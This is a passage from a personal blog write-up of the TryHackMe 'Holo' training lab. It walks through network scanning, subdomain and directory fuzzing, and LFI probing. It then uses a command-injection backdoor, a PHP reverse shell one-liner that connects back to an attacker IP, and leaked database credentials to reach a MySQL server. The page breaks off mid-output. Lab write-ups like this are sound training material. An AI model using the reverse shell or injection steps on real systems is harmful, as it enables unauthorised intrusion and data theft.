<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Holo - TryHackMe | Portfolio, Writeups &amp; Projects</title><meta name="author" content="Faris Mujcinagic"><meta name="copyright" content="Faris Mujcinagic"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Holo Corporate is a network provided by TryHackMe, which I have used to prepare for the PNPT by TCM Security, and gain better understanding of pivotin"><link rel="shortcut icon" href="/Portfolio-Website/img/favicon.png"><link rel="canonical" href="https://fmujcinagic.github.io/Portfolio-Website/2024/08/25/Holo/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/Portfolio-Website/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/Portfolio-Website/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Holo - TryHackMe',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-06 20:55:17'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/Portfolio-Website/img/portrait_crop.JPG" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/Portfolio-Website/archives/"><div class="headline">Articles</div><div class="length-num">3</div></a><a href="/Portfolio-Website/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/Portfolio-Website/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/Portfolio-Website/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/Portfolio-Website/about/"><i class="fa-fw fas fa-folder-open"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/Portfolio-Website/projects/"><i class="fa-fw fas fa-folder-open"></i><span> Projects</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/Portfolio-Website/img/hololive_cover.png')"><nav id="nav"><span id="blog-info"><a href="/Portfolio-Website/" title="Portfolio, Writeups &amp; Projects"><span class="site-name">Portfolio, Writeups &amp; Projects</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/Portfolio-Website/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/Portfolio-Website/about/"><i class="fa-fw fas fa-folder-open"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/Portfolio-Website/projects/"><i class="fa-fw fas fa-folder-open"></i><span> Projects</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Holo - TryHackMe</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-08-25T12:13:05.000Z" title="Created 2024-08-25 14:13:05">2024-08-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-06T18:55:17.914Z" title="Updated 2024-09-06 20:55:17">2024-09-06</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/Portfolio-Website/categories/Pivoting/">Pivoting</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>Holo Corporate is a network provided by TryHackMe, which I have used to prepare for the PNPT by TCM Security, and gain better understanding of pivoting and lateral movement.</p>
<blockquote>
<p>Holo is an Active Directory (AD) and Web-App attack lab that aims to teach core web attack vectors and more advanced AD attack techniques. This network simulates an external penetration test on a corporate network.</p>
</blockquote>
<h1 id="Walkthrough"><a href="#Walkthrough" class="headerlink" title="Walkthrough"></a>Walkthrough</h1><p>We start with the following scope of engagement: <code>10.200.x.0/24</code> and <code>192.168.100.0/24</code>. These represent two subnets within our target environment. The <code>/24</code> notation indicates that each subnet can contain 256 IP addresses, ranging from 0 to 255. Now, our first task is to identify the specific subnet within the <code>10.200.x.0/24</code> range, as the <code>x</code> in this case is unspecified and could vary. In order to determine the subnet of <code>10.200.x.0/24</code> , command <code>route</code> is used (confirming which interface the traffic is routed through).</p>
<p><img src="/Portfolio-Website/img/image_holo.png" alt="/img/image_holo.png"></p>
<p>Scope is narrowed down to <code>10.200.107.0/24</code> and <code>192.168.100.0/24</code>. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">sudo</span> nmap -sn -n 10.200.107.0/24 192.168.100.0/24</span><br><span class="line">Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2024-08-29 09:39 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.200.107.33</span><br><span class="line"></span><br><span class="line">Host is up (0.081s latency).</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.200.107.250</span><br><span class="line"></span><br><span class="line">Host is up (0.074s latency).</span><br></pre></td></tr></table></figure>

<p>For <code>102.168.100.0/24</code> we get the result that all hosts are up, which can indicate that firewalls&#x2F;IDS&#x2F;IPS are configured to respond to ICMP Echo Requests (pings) on behalf of all IP addresses in the network. This is sometimes done to obscure the actual network layout from unauthorized scanners. Therefore, we focus on <code>10.200.107.33</code> and <code>10.200.107.250</code> .</p>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>We proceed to scan more aggressively  one by one, because from my understanding parallel scans could cause unreliable results, <strong>because of the VPN connection that’s needed, and could act as a limiting traffic-factor and can interfere with heavy parallel scanning</strong>.</p>
<p><img src="/Portfolio-Website/img/image_holo1.png" alt="/img/image_holo1.png"></p>
<p><img src="/Portfolio-Website/img/image_holo2.png" alt="/img/image_holo2.png"></p>
<p>Attack surface isn’t that much wide, so we focus on port 80, i.e. <a target="_blank" rel="noopener" href="http://10.200.107.33/"><code>http://10.200.107.33</code></a>.</p>
<p><img src="/Portfolio-Website/img/image_holo3.png" alt="/img/image_holo3.png"></p>
<p>Site is not fully loaded, what usually indicates that our machine cannot resolve <code>holo.live</code>, so usually we proceed and edit <code>/etc/hosts</code> but before doing so, we can try fuzzing additional subdomains. Using tools like <code>ffuf</code>, <code>Gobuster</code>, or <code>dnsrecon</code>, we can identify additional subdomains by testing common or custom wordlists (I perfer using seclists).</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">└─$ wfuzz -u 10.200.107.33 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="string">&quot;Host: FUZZ.holo.live&quot;</span> --hw 1402</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://10.200.107.33/</span><br><span class="line">Total requests: 114441</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                            </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000024:   200        75 L     158 W      1845 Ch     <span class="string">&quot;admin&quot;</span>                                            </span><br><span class="line">000000019:   200        271 L    701 W      7515 Ch     <span class="string">&quot;dev&quot;</span>                                              </span><br><span class="line">000000001:   200        155 L    1398 W     21405 Ch    <span class="string">&quot;www&quot;</span>                                              </span><br><span class="line">000000689:   400        12 L     53 W       422 Ch      <span class="string">&quot;gc._msdcs&quot;</span>                                        </span><br><span class="line">000002180:   301        0 L      0 W        0 Ch        <span class="string">&quot;www.www&quot;</span></span><br></pre></td></tr></table></figure>

<p>Now when few more are discovered, we proceed to add the following to <code>/etc/hosts</code>:<br><code>10.200.107.33    admin.holo.live 10.200.107.33    dev.holo.live 10.200.107.33    www.holo.live</code></p>
<p>We can load the website again:</p>
<p><img src="/Portfolio-Website/img/image_holo4.png" alt="/img/image_holo4.png"></p>
<p>Taking a look at <a target="_blank" rel="noopener" href="http://admin.holo.live/"><code>admin.holo.live</code></a> and <code>dev.holo.live</code> :</p>
<p><img src="/Portfolio-Website/img/image_holo5.png" alt="/img/image_holo5.png"></p>
<p><img src="/Portfolio-Website/img/image_holo6.png" alt="/img/image_holo6.png"></p>
<p>The next step would be to bust some directories for all of three domanis. This technique is used to discover hidden or non-public directories and files on a web server that might be useful for further exploitation or information gathering.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">└─$ gobuster <span class="built_in">dir</span> -u http://www.holo.live/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        </span><br><span class="line">===============================================================                                                     </span><br><span class="line">Gobuster v3.6                                                                                                       </span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)                                                       </span><br><span class="line">===============================================================                                                     </span><br><span class="line">[+] Url:                     http://www.holo.live/                                                                  </span><br><span class="line">[+] Method:                  GET                                                                                    </span><br><span class="line">[+] Threads:                 10                                                                                     </span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                           </span><br><span class="line">[+] Negative Status codes:   404                                                                                    </span><br><span class="line">[+] User Agent:              gobuster/3.6                                                                           </span><br><span class="line">[+] Timeout:                 10s                                                                                    </span><br><span class="line">===============================================================                                                     </span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode                                                                     </span><br><span class="line">===============================================================                                                     </span><br><span class="line">/login                (Status: 302) [Size: 0] [--&gt; http://www.holo.live/wp-login.php]                               </span><br><span class="line">/0                    (Status: 301) [Size: 0] [--&gt; http://www.holo.live/0/]                                         </span><br><span class="line">/wp-content           (Status: 301) [Size: 319] [--&gt; http://www.holo.live/wp-content/]                              </span><br><span class="line">/admin                (Status: 302) [Size: 0] [--&gt; http://www.holo.live/wp-admin/]                                  </span><br><span class="line">/wp-login             (Status: 403) [Size: 278]                                                                     </span><br><span class="line">/wp-includes          (Status: 301) [Size: 320] [--&gt; http://www.holo.live/wp-includes/]                             </span><br><span class="line">/upgrade              (Status: 301) [Size: 316] [--&gt; http://www.holo.live/upgrade/]                                 </span><br><span class="line">/javascript           (Status: 301) [Size: 319] [--&gt; http://www.holo.live/javascript/]                              </span><br><span class="line">/<span class="string">&#x27;                    (Status: 301) [Size: 0] [--&gt; http://www.holo.live/]                                           </span></span><br><span class="line"><span class="string">/dashboard            (Status: 302) [Size: 0] [--&gt; http://www.holo.live/wp-admin/]                                  </span></span><br><span class="line"><span class="string">/%20                  (Status: 301) [Size: 0] [--&gt; http://www.holo.live/]  </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">└─$ gobuster <span class="built_in">dir</span> -u http://dev.holo.live/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://dev.holo.live/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 315] [--&gt; http://dev.holo.live/images/]</span><br><span class="line">/login                (Status: 403) [Size: 278]</span><br><span class="line">/admin                (Status: 403) [Size: 278]</span><br><span class="line">/css                  (Status: 301) [Size: 312] [--&gt; http://dev.holo.live/css/]</span><br><span class="line">/js                   (Status: 301) [Size: 311] [--&gt; http://dev.holo.live/js/]</span><br><span class="line">/javascript           (Status: 301) [Size: 319] [--&gt; http://dev.holo.live/javascript/]</span><br><span class="line">/fonts                (Status: 301) [Size: 314] [--&gt; http://dev.holo.live/fonts/]</span><br></pre></td></tr></table></figure>

<p>To do scans above I have used <code>gobuster</code> , but there are many tools do so depending on what level of depth we want (we could also try with <code>feroxbuster</code>). However it does not seem to show <code>robots.txt</code> available, which is indeed present, according to <code>nmap</code> scan.</p>
<p>For the <code>www.holo.live</code>:</p>
<p><img src="/Portfolio-Website/img/image_holo7.png" alt="/img/image_holo7.png"></p>
<p>For the <code>admin.holo.live</code>:</p>
<p><img src="/Portfolio-Website/img/image_holo8.png" alt="/img/image_holo8.png"></p>
<p>Let’s see how could we utilize these leaked file names. The usual web attack we can perform is LFI (Local File Inclusion). In an LFI attack, the goal is to trick the web application into including and potentially executing files from the server’s local file system. By manipulating parameters that reference files (such as through query strings or form data), we might be able to include sensitive files like <code>/etc/passwd</code>, configuration files, or even logs that contain sensitive information.</p>
<p><img src="/Portfolio-Website/img/image_holo9.png" alt="/img/image_holo9.png"></p>
<p><img src="/Portfolio-Website/img/image_holo10.png" alt="/img/image_holo10.png"></p>
<p>It seems like the file mentioned in <code>robots.txt</code> indeed exists, and after navigating to it, php script is being downlaoded with the following content:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I know you forget things, so I&#x27;m leaving this note for you:</span><br><span class="line">admin:DBManagerLogin!</span><br><span class="line">- gurag &lt;3</span><br></pre></td></tr></table></figure>

<p>After getting credentials, we try entering them on admin’s dashboard:</p>
<p><img src="/Portfolio-Website/img/image_holo11.png" alt="/img/image_holo11.png"></p>
<h2 id="Access-granted"><a href="#Access-granted" class="headerlink" title="Access granted!"></a>Access granted!</h2><p>Usually we would fuzz against this website, to see if any interesting additional directory pops up, but in this case, lets go for source code investigation</p>
<p><img src="/Portfolio-Website/img/image_holo12.png" alt="/img/image_holo12.png"></p>
<p>There are about 300-400 lines of code, which isn’t much to go through briefly, but in this case, odd <code>if statement</code> pops up. This allows us to execute arbitrary command with <code>cmd</code>, otherwise the normal website outlook is displayed. Lets try with test command <code>whoami</code>.</p>
<p><img src="/Portfolio-Website/img/image_holo13.png" alt="/img/image_holo13.png"></p>
<p>Since we know that we have Apache server, the likelihood of PHP presence is high (web applications hosted on Apache servers frequently utilize PHP for dynamic content management). We also have evidence for that, because we are working on <code>dashboard.php</code> , what indicates that we can go to: <a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> , and use the PHP one liner in order to obtain the rev shell. </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php <span class="operator">-</span>r <span class="string">&#x27;$sock=fsockopen(&quot;10.50.103.59&quot;,5555);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>

<p>I like to do that by using Burp Suite, but you can also encode it via: <a target="_blank" rel="noopener" href="https://www.urlencoder.org/">https://www.urlencoder.org/</a> and run it as parameter. This will encode all special characters into their URL-encoded equivalents (e.g., spaces become <code>%20</code>, <code>=</code> becomes <code>%3D</code>, etc.). This part is critical for command injections.</p>
<p><img src="/Portfolio-Website/img/image_holo14.png" alt="/img/image_holo14.png"></p>
<p>We are able to catch a shell on our side, and prove that currently logged user is  <code>www-data</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc -nvlp 5555</span><br><span class="line">listening on [any] 5555 ...</span><br><span class="line">connect to [10.50.103.59] from (UNKNOWN) [10.200.107.33] 60388</span><br><span class="line">/bin/sh: 0: can&#x27;t access tty; job control turned off</span><br><span class="line">$ dir</span><br><span class="line">action_page.php  dashboard.php   docs      hololive.png  robots.txt</span><br><span class="line">assets           db_connect.php  examples  index.php     supersecretdir</span><br><span class="line">$ whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<h2 id="Situational-Awareness"><a href="#Situational-Awareness" class="headerlink" title="Situational Awareness"></a>Situational Awareness</h2><p>In order to determine what is around in in the network, we can run the <code>arp -a</code>  command in order to see what interactions our machine had in recent history (whenever machine interacts with another device on the local network, it needs to know the corresponding MAC address for the device’s IP address. This mapping is stored in the ARP cache), therefore this action isn’t loud since it only lists cache info. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ arp -a                                                                                                            </span><br><span class="line">arp -a                                                                                                              </span><br><span class="line">ip-192-168-100-1.eu-west-1.compute.internal (192.168.100.1) at 02:42:6f:60:5e:c4 [ether] on eth0</span><br></pre></td></tr></table></figure>

<p><img src="/Portfolio-Website/img/image_holo15.png" alt="/img/image_holo15.png"></p>
<p>This matches perfectly with the network topology that is laid out at the beginning.</p>
<p><img src="/Portfolio-Website/img/image_holo16.png" alt="/img/image_holo16.png"></p>
<aside>
💡 By investigating the root folder we can see that we are indeed running a docker container.

</aside>

<p>In order to look for the available ports, we have multiple options. Scripts such as full bash port scanner and also port scanner version in Python are always a good option, but a lot of times we are in restricted environment. Let’s see how can we look for the ports using <code>netcat</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nc -zv 192.168.100.1 1-65535                                                                                      </span><br><span class="line">nc -zv 192.168.100.1 1-65535</span><br><span class="line">ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 33060 (?) open</span><br><span class="line">ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 8080 (http-alt) open</span><br><span class="line">ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 3306 (mysql) open</span><br><span class="line">ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 80 (http) open</span><br><span class="line">ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 22 (ssh) open</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<aside>
💡 Alternative would be to transfer nmap, and to perform nmap scan on compromised machine directly (take a look at static binaries → [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries) ):

<p>$ .&#x2F;nmap -p- 192.168.100.0&#x2F;24<br>.&#x2F;nmap -p- 192.168.100.0&#x2F;24</p>
<p>Starting Nmap 6.49BETA1 ( <a target="_blank" rel="noopener" href="http://nmap.org/">http://nmap.org</a> ) at 2024-08-29 11:36 GMT<br>Unable to find nmap-services!  Resorting to &#x2F;etc&#x2F;services<br>Cannot find nmap-payloads. UDP payloads are disabled.<br>Nmap scan report for ip-192-168-100-1.eu-west-1.compute.internal (192.168.100.1)<br>Host is up (0.00031s latency).<br>Not shown: 65530 closed ports<br>PORT      STATE SERVICE<br>22&#x2F;tcp    open  ssh<br>80&#x2F;tcp    open  http<br>3306&#x2F;tcp  open  mysql<br>8080&#x2F;tcp  open  http-alt<br>33060&#x2F;tcp open  unknown</p>
</aside>

<h2 id="Gaining-Access-to-Remote-MYSQL-Server"><a href="#Gaining-Access-to-Remote-MYSQL-Server" class="headerlink" title="Gaining Access to Remote MYSQL Server"></a>Gaining Access to Remote MYSQL Server</h2><p>We have seen that we have <code>mysql</code> available on port 3306. We can take a look around if we can find any valid credentials related to database access. In <code>/var/www</code> we can find the following:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ cat db_connect.php</span><br><span class="line">cat db_connect.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_SRV&#x27;, &#x27;192.168.100.1&#x27;);</span><br><span class="line">define(&#x27;DB_PASSWD&#x27;, &quot;!123SecureAdminDashboard321!&quot;);</span><br><span class="line">define(&#x27;DB_USER&#x27;, &#x27;admin&#x27;);</span><br><span class="line">define(&#x27;DB_NAME&#x27;, &#x27;DashboardDB&#x27;);</span><br><span class="line"></span><br><span class="line">$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);</span><br><span class="line"></span><br><span class="line">if($connection == false)&#123;</span><br><span class="line"></span><br><span class="line">        die(&quot;Error: Connection to Database could not be made.&quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>From here it is straightforward to try to connect to <code>mysql</code> server. Remember that we need to specify the host otherwise it will try connecting locally (on L-SRV02 instead of L-SRV01).</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ mysql <span class="operator">-</span>u admin <span class="operator">-</span>p <span class="operator">-</span>h <span class="number">192.168</span><span class="number">.100</span><span class="number">.1</span></span><br><span class="line">mysql <span class="operator">-</span>u admin <span class="operator">-</span>p <span class="operator">-</span>h <span class="number">192.168</span><span class="number">.100</span><span class="number">.1</span></span><br><span class="line">Enter password: <span class="operator">!</span><span class="number">123</span>SecureAdminDashboard321<span class="operator">!</span></span><br><span class="line"></span><br><span class="line">Welcome <span class="keyword">to</span> the MySQL monitor.  Commands <span class="keyword">end</span> <span class="keyword">with</span> ; <span class="keyword">or</span> \g.</span><br><span class="line">Your MySQL connection id <span class="keyword">is</span> <span class="number">21</span></span><br><span class="line">Server version: <span class="number">8.0</span><span class="number">.22</span><span class="number">-0</span>ubuntu0<span class="number">.20</span><span class="number">.04</span><span class="number">.2</span> (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) <span class="number">2000</span>, <span class="number">2020</span>, Oracle <span class="keyword">and</span><span class="operator">/</span><span class="keyword">or</span> its affiliates. <span class="keyword">All</span> rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle <span class="keyword">is</span> a registered trademark <span class="keyword">of</span> Oracle Corporation <span class="keyword">and</span><span class="operator">/</span><span class="keyword">or</span> its</span><br><span class="line">affiliates. Other names may be trademarks <span class="keyword">of</span> their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> help. Type <span class="string">&#x27;\c&#x27;</span> <span class="keyword">to</span> clear the <span class="keyword">current</span> input statement.</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> DashboardDB        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span 